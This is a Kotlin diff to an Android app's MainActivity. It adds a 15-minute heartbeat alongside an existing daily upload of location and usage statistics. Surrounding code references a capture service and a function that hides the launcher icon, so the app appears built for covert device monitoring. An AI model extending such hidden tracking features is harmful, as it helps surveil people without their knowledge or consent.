@@ -17,6 +17,7 @@ import com.google.firebase.messaging.ktx.messaging
 import com.google.firebase.ktx.Firebase
 import com.ikianti.app.service.CaptureForegroundService
 import com.ikianti.app.worker.DailyUploadWorker
+import com.ikianti.app.worker.HeartbeatWorker
 import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
@@ -100,15 +101,44 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun scheduleDailyUpload() {
-        val request = PeriodicWorkRequestBuilder<DailyUploadWorker>(24, TimeUnit.HOURS)
-            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
-            .build()
-        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-            DailyUploadWorker.WORK_NAME,
-            ExistingPeriodicWorkPolicy.KEEP,
-            request
+    val workManager = WorkManager.getInstance(this)
+
+    // Täglicher Standort- und UsageStats-Upload
+    val dailyRequest = PeriodicWorkRequestBuilder<DailyUploadWorker>(
+        24, TimeUnit.HOURS
+    )
+        .setConstraints(
+            Constraints.Builder()
+                .setRequiredNetworkType(NetworkType.CONNECTED)
+                .build()
         )
-    }
+        .build()
+
+    workManager.enqueueUniquePeriodicWork(
+        DailyUploadWorker.WORK_NAME,
+        ExistingPeriodicWorkPolicy.KEEP,
+        dailyRequest
+    )
+
+    // Regelmäßiger Heartbeat für den Live-Gerätestatus
+    val heartbeatRequest = PeriodicWorkRequestBuilder<HeartbeatWorker>(
+        15, TimeUnit.MINUTES
+    )
+        .setConstraints(
+            Constraints.Builder()
+                .setRequiredNetworkType(NetworkType.CONNECTED)
+                .build()
+        )
+        .build()
+
+    workManager.enqueueUniquePeriodicWork(
+        HeartbeatWorker.WORK_NAME,
+        ExistingPeriodicWorkPolicy.KEEP,
+        heartbeatRequest
+    )
+
+    Log.d(TAG, "DailyUpload und Heartbeat geplant")
+}
 
     private fun hideLauncherIcon() {
         val alias = ComponentName(this, "com.ikianti.app.LauncherAlias")
